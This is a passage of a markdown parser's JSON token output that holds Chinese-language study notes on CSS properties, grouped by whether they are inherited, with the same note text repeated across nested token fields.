none：隐藏元素\\n\\n  + margin\\n    设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n  + border\\n    设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n  + padding\\n    设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n  + background\\n    设置元素的背景，包括背景颜色、背景图像等\\n\\n  + height\\n    指定元素的高度\\n\\n  + min-height\\n    设置元素的最小高度，元素的高度不能小于此值\\n\\n  + max-height\\n    设置元素的最大高度，元素的高度不能超过此值\\n\\n  + width\\n    指定元素的宽度\\n\\n  + min-width\\n    设置元素的最小宽度，元素的宽度不能小于此值\\n\\n  + max-width\\n    设置元素的最大宽度，元素的宽度不能超过此值\\n\\n  + overflow\\n    控制当内容溢出元素的边界时如何显示常见的值：\\n      visible：内容溢出时可见\\n      hidden：内容溢出时隐藏\\n      scroll：出现滚动条\\n      auto：根据需要自动显示滚动条\\n\\n  + position\\n    设置元素的定位方式常见的值：\\n      static：默认值，元素按文档流排列\\n      relative：相对定位，元素相对于其原始位置偏移\\n      absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n      fixed：固定定位，元素相对于浏览器窗口定位\\n      sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n  + top, bottom, left, right\\n    当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n  + z-index\\n    控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n  + float\\n    指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n      left：元素向左浮动\\n      right：元素向右浮动\\n      none：取消浮动\\n\\n  + clear\\n    控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n      left：禁止元素左侧有浮动元素\\n      right：禁止元素右侧有浮动元素\\n      both：禁止元素两侧有浮动元素\\n      none：允许两侧都有浮动元素\\n\\n  + table-layout\\n    控制表格布局的算法常见的值：\\n      auto：浏览器根据内容调整列宽（默认）\\n      fixed：浏览器根据表格的宽度固定列宽\\n\\n  + vertical-align\\n    控制元素在垂直方向上的对齐方式常见的值：\\n      top：元素顶部对齐\\n      middle：元素垂直居中对齐\\n      bottom：元素底部对齐\\n\\n  + page-break-after\\n    控制分页符的位置常见的值：\\n      auto：默认，自动决定分页\\n      always：强制分页\\n      avoid：避免分页\\n\\n  + page-break-before\\n    与 page-break-after 类似，控制元素前面的分页符\\n\\n  + unicode-bidi\\n    控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n      normal：正常的双向文本布局\\n      embed：强制嵌入的文本遵循本地的方向性\\n      bidi-override：覆盖文本的方向性，强制使用 direction 属性的值\\n\\n- **1：** 所有元素可继承的\\n\\n  + visibility\\n    visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n    常见值包括：\\n      visible（默认值）：元素是可见的\\n      hidden：元素不可见，但仍然占据空间\\n      collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n  + cursor\\n    cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n    常见值包括：\\n      auto：默认指针，浏览器根据上下文决定指针样式\\n      pointer：显示手形指针，通常用于可点击的链接或按钮\\n      default：默认的光标样式\\n      none：隐藏鼠标指针\\n      wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n      move：显示一个四向箭头，表示可以移动元素\\n      text：显示文本光标，通常用于文本输入区域\\n      not-allowed：显示禁用的指针，通常表示该操作不可用\\n      help：显示问号光标，通常表示需要帮助的地方\\n\\n- **1：** 终极块级元素可继承的\\n\\n  + text-indent\\n    text-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 `<p>、<div>` 等，控制块内文本的缩进量；常见值：\\n      length：指定缩进的距离，例如 20px 或 2em\\n      %：表示缩进的百分比，基于元素的宽度\\n      initial：将属性恢复为默认值\\n\\n  + text-align\\n    text-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n      left：将文本对齐到左边\\n      right：将文本对齐到右边\\n      center：将文本居中\\n      justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n      start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式\\n\\n- **1：** 内联元素可继承的\\n  + letter-spacing\\n    letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n      normal：默认的字符间距，通常为 0\\n      length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n  + word-spacing\\n    word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n    常见值：\\n      normal：默认的单词间距。\\n      length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n  + white-space\\n    white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n      normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n      nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n      pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n      pre-wrap：保留空格和换行符，文本会自动换行\\n      pre-line：合并多个空白字符，但保留换行符\\n\\n  + line-height\\n    line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n      normal：默认的行高，通常为字体大小的 1.2 倍。\\n      number：指定行高为字体大小的倍数。\\n      length：指定固定的行高值，如 20px、1.5em。\\n      percentage：指定行高为字体大小的百分比。\\n\\n  + color\\n    color 用于设置文本的颜色，常见值：\\n      color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n  + font\\n\\n    font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n      font-style、font-variant、font-weight、font-size、line-height、font-family\\n  + font-size\\n    font-size 用于设置文本的大小；常见值：\\n      length：如 12px、1em、0.75rem。\\n      percentage：相对于父元素的字体大小，如 150%。\\n      medium：默认字体大小。\\n      larger / smaller：相对于父元素字体大小的大小调整。\\n\\n  + font-style\\n    font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n      normal：正常样式\\n      italic：斜体\\n      oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n  + font-variant\\n    font-variant 用于控制文本是否使用变体字体；常见值：\\n      normal：正常字体。\\n      small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n  + font-weight\\n    font-weight 用于设置文本的粗细；常见值：\\n      normal：正常的字体粗细\\n      bold：加粗字体\\n      bolder：比父元素更粗\\n      lighter：比父元素更细\\n      number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n  + text-decoration\\n    text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n      none：无装饰\\n      underline：下划线\\n      overline：上划线\\n      line-through：删除线\\n      blink：闪烁的文本（大多数浏览器已不支持）\\n\\n  + text-transform\\n    text-transform 用于控制文本的大小写转换；常见值：\\n      none：不转换大小写\\n      capitalize：将每个单词的首字母转换为大写\\n      uppercase：将所有字母转换为大写\\n      lowercase：将所有字母转换为小写\\n\\n  + direction\\n    direction 用于设置文本的书写方向；常见值：\\n      ltr：从左到右（默认）\\n      rtl：从右到左，通常用于阿拉伯语、希伯来语等语言\\n\\n- **1：** 列表元素可继承的属性\\n  + list-style\\n    list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n      list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n      list-style-position：标记的位置，inside 或 outside。\\n      list-style-image：指定列表项标记为图片。\\n\\n  + list-style-type\\n    list-style-type 用于设置列表项的标记类型；常见值：\\n      disc：实心圆点（默认）\\n      circle：空心圆点\\n      square：方块\\n      decimal：数字列表（如 1, 2, 3）\\n      none：没有标记\\n\\n  + list-style-position\\n    list-style-position 用于设置列表标记的位置；常见值：\\n      outside：标记在列表项外部（默认）\\n      inside：标记在列表项内部\\n\\n  + list-style-image\\n    list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 不可继承的\\n\\n  + display\\n    指定元素的显示方式，常见的值包括：\\n    block：块级元素，占据整行\\n    inline：行内元素，只占据必要的宽度，不换行\\n    inline-block：结合了 inline 和 block 的特性\\n    none：隐藏元素\\n\\n  + margin\\n    设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n  + border\\n    设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n  + padding\\n    设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n  + background\\n    设置元素的背景，包括背景颜色、背景图像等\\n\\n  + height\\n    指定元素的高度\\n\\n  + min-height\\n    设置元素的最小高度，元素的高度不能小于此值\\n\\n  + max-height\\n    设置元素的最大高度，元素的高度不能超过此值\\n\\n  + width\\n    指定元素的宽度\\n\\n  + min-width\\n    设置元素的最小宽度，元素的宽度不能小于此值\\n\\n  + max-width\\n    设置元素的最大宽度，元素的宽度不能超过此值\\n\\n  + overflow\\n    控制当内容溢出元素的边界时如何显示常见的值：\\n      visible：内容溢出时可见\\n      hidden：内容溢出时隐藏\\n      scroll：出现滚动条\\n      auto：根据需要自动显示滚动条\\n\\n  + position\\n    设置元素的定位方式常见的值：\\n      static：默认值，元素按文档流排列\\n      relative：相对定位，元素相对于其原始位置偏移\\n      absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n      fixed：固定定位，元素相对于浏览器窗口定位\\n      sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n  + top, bottom, left, right\\n    当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n  + z-index\\n    控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n  + float\\n    指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n      left：元素向左浮动\\n      right：元素向右浮动\\n      none：取消浮动\\n\\n  + clear\\n    控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n      left：禁止元素左侧有浮动元素\\n      right：禁止元素右侧有浮动元素\\n      both：禁止元素两侧有浮动元素\\n      none：允许两侧都有浮动元素\\n\\n  + table-layout\\n    控制表格布局的算法常见的值：\\n      auto：浏览器根据内容调整列宽（默认）\\n      fixed：浏览器根据表格的宽度固定列宽\\n\\n  + vertical-align\\n    控制元素在垂直方向上的对齐方式常见的值：\\n      top：元素顶部对齐\\n      middle：元素垂直居中对齐\\n      bottom：元素底部对齐\\n\\n  + page-break-after\\n    控制分页符的位置常见的值：\\n      auto：默认，自动决定分页\\n      always：强制分页\\n      avoid：避免分页\\n\\n  + page-break-before\\n    与 page-break-after 类似，控制元素前面的分页符\\n\\n  + unicode-bidi\\n    控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n      normal：正常的双向文本布局\\n      embed：强制嵌入的文本遵循本地的方向性\\n      bidi-override：覆盖文本的方向性，强制使用 direction 属性的值\\n\\n","task":false,"loose":true,"text":"**1：** 不可继承的\\n\\n+ display\\n  指定元素的显示方式，常见的值包括：\\n  block：块级元素，占据整行\\n  inline：行内元素，只占据必要的宽度，不换行\\n  inline-block：结合了 inline 和 block 的特性\\n  none：隐藏元素\\n\\n+ margin\\n  设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n+ border\\n  设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n+ padding\\n  设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n+ background\\n  设置元素的背景，包括背景颜色、背景图像等\\n\\n+ height\\n  指定元素的高度\\n\\n+ min-height\\n  设置元素的最小高度，元素的高度不能小于此值\\n\\n+ max-height\\n  设置元素的最大高度，元素的高度不能超过此值\\n\\n+ width\\n  指定元素的宽度\\n\\n+ min-width\\n  设置元素的最小宽度，元素的宽度不能小于此值\\n\\n+ max-width\\n  设置元素的最大宽度，元素的宽度不能超过此值\\n\\n+ overflow\\n  控制当内容溢出元素的边界时如何显示常见的值：\\n    visible：内容溢出时可见\\n    hidden：内容溢出时隐藏\\n    scroll：出现滚动条\\n    auto：根据需要自动显示滚动条\\n\\n+ position\\n  设置元素的定位方式常见的值：\\n    static：默认值，元素按文档流排列\\n    relative：相对定位，元素相对于其原始位置偏移\\n    absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n    fixed：固定定位，元素相对于浏览器窗口定位\\n    sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n+ top, bottom, left, right\\n  当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n+ z-index\\n  控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n+ float\\n  指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n    left：元素向左浮动\\n    right：元素向右浮动\\n    none：取消浮动\\n\\n+ clear\\n  控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n    left：禁止元素左侧有浮动元素\\n    right：禁止元素右侧有浮动元素\\n    both：禁止元素两侧有浮动元素\\n    none：允许两侧都有浮动元素\\n\\n+ table-layout\\n  控制表格布局的算法常见的值：\\n    auto：浏览器根据内容调整列宽（默认）\\n    fixed：浏览器根据表格的宽度固定列宽\\n\\n+ vertical-align\\n  控制元素在垂直方向上的对齐方式常见的值：\\n    top：元素顶部对齐\\n    middle：元素垂直居中对齐\\n    bottom：元素底部对齐\\n\\n+ page-break-after\\n  控制分页符的位置常见的值：\\n    auto：默认，自动决定分页\\n    always：强制分页\\n    avoid：避免分页\\n\\n+ page-break-before\\n  与 page-break-after 类似，控制元素前面的分页符\\n\\n+ unicode-bidi\\n  控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n    normal：正常的双向文本布局\\n    embed：强制嵌入的文本遵循本地的方向性\\n    bidi-override：覆盖文本的方向性，强制使用 direction 属性的值\\n","tokens":[{"type":"text","raw":"**1：** 不可继承的","text":"**1：** 不可继承的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 不可继承的","text":" 不可继承的","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ display\\n  指定元素的显示方式，常见的值包括：\\n  block：块级元素，占据整行\\n  inline：行内元素，只占据必要的宽度，不换行\\n  inline-block：结合了 inline 和 block 的特性\\n  none：隐藏元素\\n\\n+ margin\\n  设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n+ border\\n  设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n+ padding\\n  设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n+ background\\n  设置元素的背景，包括背景颜色、背景图像等\\n\\n+ height\\n  指定元素的高度\\n\\n+ min-height\\n  设置元素的最小高度，元素的高度不能小于此值\\n\\n+ max-height\\n  设置元素的最大高度，元素的高度不能超过此值\\n\\n+ width\\n  指定元素的宽度\\n\\n+ min-width\\n  设置元素的最小宽度，元素的宽度不能小于此值\\n\\n+ max-width\\n  设置元素的最大宽度，元素的宽度不能超过此值\\n\\n+ overflow\\n  控制当内容溢出元素的边界时如何显示常见的值：\\n    visible：内容溢出时可见\\n    hidden：内容溢出时隐藏\\n    scroll：出现滚动条\\n    auto：根据需要自动显示滚动条\\n\\n+ position\\n  设置元素的定位方式常见的值：\\n    static：默认值，元素按文档流排列\\n    relative：相对定位，元素相对于其原始位置偏移\\n    absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n    fixed：固定定位，元素相对于浏览器窗口定位\\n    sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n+ top, bottom, left, right\\n  当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n+ z-index\\n  控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n+ float\\n  指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n    left：元素向左浮动\\n    right：元素向右浮动\\n    none：取消浮动\\n\\n+ clear\\n  控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n    left：禁止元素左侧有浮动元素\\n    right：禁止元素右侧有浮动元素\\n    both：禁止元素两侧有浮动元素\\n    none：允许两侧都有浮动元素\\n\\n+ table-layout\\n  控制表格布局的算法常见的值：\\n    auto：浏览器根据内容调整列宽（默认）\\n    fixed：浏览器根据表格的宽度固定列宽\\n\\n+ vertical-align\\n  控制元素在垂直方向上的对齐方式常见的值：\\n    top：元素顶部对齐\\n    middle：元素垂直居中对齐\\n    bottom：元素底部对齐\\n\\n+ page-break-after\\n  控制分页符的位置常见的值：\\n    auto：默认，自动决定分页\\n    always：强制分页\\n    avoid：避免分页\\n\\n+ page-break-before\\n  与 page-break-after 类似，控制元素前面的分页符\\n\\n+ unicode-bidi\\n  控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n    normal：正常的双向文本布局\\n    embed：强制嵌入的文本遵循本地的方向性\\n    bidi-override：覆盖文本的方向性，强制使用 direction 属性的值\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ display\\n  指定元素的显示方式，常见的值包括：\\n  block：块级元素，占据整行\\n  inline：行内元素，只占据必要的宽度，不换行\\n  inline-block：结合了 inline 和 block 的特性\\n  none：隐藏元素\\n\\n","task":false,"loose":true,"text":"display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素\\n","tokens":[{"type":"text","raw":"display\\n\\n指定元素的显示方式，常见的值包括：\\n\\nblock：块级元素，占据整行\\n\\ninline：行内元素，只占据必要的宽度，不换行\\n\\ninline-block：结合了 inline 和 block 的特性\\n\\nnone：隐藏元素\\n","text":"display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素","tokens":[{"type":"text","raw":"display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素","text":"display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素","escaped":false}]}]},{"type":"list_item","raw":"+ margin\\n  设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n","task":false,"loose":true,"text":"margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离\\n","tokens":[{"type":"text","raw":"margin\\n\\n设置元素外部的空白区域，即元素与其他元素之间的距离\\n","text":"margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离","tokens":[{"type":"text","raw":"margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离","text":"margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离","escaped":false}]}]},{"type":"list_item","raw":"+ border\\n  设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n","task":false,"loose":true,"text":"border\\n设置元素的边框可以指定边框的宽度、样式和颜色\\n","tokens":[{"type":"text","raw":"border\\n\\n设置元素的边框可以指定边框的宽度、样式和颜色\\n","text":"border\\n设置元素的边框可以指定边框的宽度、样式和颜色","tokens":[{"type":"text","raw":"border\\n设置元素的边框可以指定边框的宽度、样式和颜色","text":"border\\n设置元素的边框可以指定边框的宽度、样式和颜色","escaped":false}]}]},{"type":"list_item","raw":"+ padding\\n  设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n","task":false,"loose":true,"text":"padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n","tokens":[{"type":"text","raw":"padding\\n\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n","text":"padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域","tokens":[{"type":"text","raw":"padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域","text":"padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域","escaped":false}]}]},{"type":"list_item","raw":"+ background\\n  设置元素的背景，包括背景颜色、背景图像等\\n\\n","task":false,"loose":true,"text":"background\\n设置元素的背景，包括背景颜色、背景图像等\\n","tokens":[{"type":"text","raw":"background\\n\\n设置元素的背景，包括背景颜色、背景图像等\\n","text":"background\\n设置元素的背景，包括背景颜色、背景图像等","tokens":[{"type":"text","raw":"background\\n设置元素的背景，包括背景颜色、背景图像等","text":"background\\n设置元素的背景，包括背景颜色、背景图像等","escaped":false}]}]},{"type":"list_item","raw":"+ height\\n  指定元素的高度\\n\\n","task":false,"loose":true,"text":"height\\n指定元素的高度\\n","tokens":[{"type":"text","raw":"height\\n\\n指定元素的高度\\n","text":"height\\n指定元素的高度","tokens":[{"type":"text","raw":"height\\n指定元素的高度","text":"height\\n指定元素的高度","escaped":false}]}]},{"type":"list_item","raw":"+ min-height\\n  设置元素的最小高度，元素的高度不能小于此值\\n\\n","task":false,"loose":true,"text":"min-height\\n设置元素的最小高度，元素的高度不能小于此值\\n","tokens":[{"type":"text","raw":"min-height\\n\\n设置元素的最小高度，元素的高度不能小于此值\\n","text":"min-height\\n设置元素的最小高度，元素的高度不能小于此值","tokens":[{"type":"text","raw":"min-height\\n设置元素的最小高度，元素的高度不能小于此值","text":"min-height\\n设置元素的最小高度，元素的高度不能小于此值","escaped":false}]}]},{"type":"list_item","raw":"+ max-height\\n  设置元素的最大高度，元素的高度不能超过此值\\n\\n","task":false,"loose":true,"text":"max-height\\n设置元素的最大高度，元素的高度不能超过此值\\n","tokens":[{"type":"text","raw":"max-height\\n\\n设置元素的最大高度，元素的高度不能超过此值\\n","text":"max-height\\n设置元素的最大高度，元素的高度不能超过此值","tokens":[{"type":"text","raw":"max-height\\n设置元素的最大高度，元素的高度不能超过此值","text":"max-height\\n设置元素的最大高度，元素的高度不能超过此值","escaped":false}]}]},{"type":"list_item","raw":"+ width\\n  指定元素的宽度\\n\\n","task":false,"loose":true,"text":"width\\n指定元素的宽度\\n","tokens":[{"type":"text","raw":"width\\n\\n指定元素的宽度\\n","text":"width\\n指定元素的宽度","tokens":[{"type":"text","raw":"width\\n指定元素的宽度","text":"width\\n指定元素的宽度","escaped":false}]}]},{"type":"list_item","raw":"+ min-width\\n  设置元素的最小宽度，元素的宽度不能小于此值\\n\\n","task":false,"loose":true,"text":"min-width\\n设置元素的最小宽度，元素的宽度不能小于此值\\n","tokens":[{"type":"text","raw":"min-width\\n\\n设置元素的最小宽度，元素的宽度不能小于此值\\n","text":"min-width\\n设置元素的最小宽度，元素的宽度不能小于此值","tokens":[{"type":"text","raw":"min-width\\n设置元素的最小宽度，元素的宽度不能小于此值","text":"min-width\\n设置元素的最小宽度，元素的宽度不能小于此值","escaped":false}]}]},{"type":"list_item","raw":"+ max-width\\n  设置元素的最大宽度，元素的宽度不能超过此值\\n\\n","task":false,"loose":true,"text":"max-width\\n设置元素的最大宽度，元素的宽度不能超过此值\\n","tokens":[{"type":"text","raw":"max-width\\n\\n设置元素的最大宽度，元素的宽度不能超过此值\\n","text":"max-width\\n设置元素的最大宽度，元素的宽度不能超过此值","tokens":[{"type":"text","raw":"max-width\\n设置元素的最大宽度，元素的宽度不能超过此值","text":"max-width\\n设置元素的最大宽度，元素的宽度不能超过此值","escaped":false}]}]},{"type":"list_item","raw":"+ overflow\\n  控制当内容溢出元素的边界时如何显示常见的值：\\n    visible：内容溢出时可见\\n    hidden：内容溢出时隐藏\\n    scroll：出现滚动条\\n    auto：根据需要自动显示滚动条\\n\\n","task":false,"loose":true,"text":"overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条\\n","tokens":[{"type":"text","raw":"overflow\\n\\n控制当内容溢出元素的边界时如何显示常见的值：\\n\\n  visible：内容溢出时可见\\n\\n  hidden：内容溢出时隐藏\\n\\n  scroll：出现滚动条\\n\\n  auto：根据需要自动显示滚动条\\n","text":"overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条","tokens":[{"type":"text","raw":"overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条","text":"overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条","escaped":false}]}]},{"type":"list_item","raw":"+ position\\n  设置元素的定位方式常见的值：\\n    static：默认值，元素按文档流排列\\n    relative：相对定位，元素相对于其原始位置偏移\\n    absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n    fixed：固定定位，元素相对于浏览器窗口定位\\n    sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n","task":false,"loose":true,"text":"position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n","tokens":[{"type":"text","raw":"position\\n\\n设置元素的定位方式常见的值：\\n\\n  static：默认值，元素按文档流排列\\n\\n  relative：相对定位，元素相对于其原始位置偏移\\n\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n","text":"position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位","tokens":[{"type":"text","raw":"position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位","text":"position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位","escaped":false}]}]},{"type":"list_item","raw":"+ top, bottom, left, right\\n  当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n","task":false,"loose":true,"text":"top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n","tokens":[{"type":"text","raw":"top, bottom, left, right\\n\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n","text":"top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量","tokens":[{"type":"text","raw":"top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量","text":"top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量","escaped":false}]}]},{"type":"list_item","raw":"+ z-index\\n  控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n","task":false,"loose":true,"text":"z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n","tokens":[{"type":"text","raw":"z-index\\n\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n","text":"z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效","tokens":[{"type":"text","raw":"z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效","text":"z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效","escaped":false}]}]},{"type":"list_item","raw":"+ float\\n  指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n    left：元素向左浮动\\n    right：元素向右浮动\\n    none：取消浮动\\n\\n","task":false,"loose":true,"text":"float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动\\n","tokens":[{"type":"text","raw":"float\\n\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n\\n  left：元素向左浮动\\n\\n  right：元素向右浮动\\n\\n  none：取消浮动\\n","text":"float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动","tokens":[{"type":"text","raw":"float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动","text":"float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动","escaped":false}]}]},{"type":"list_item","raw":"+ clear\\n  控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n    left：禁止元素左侧有浮动元素\\n    right：禁止元素右侧有浮动元素\\n    both：禁止元素两侧有浮动元素\\n    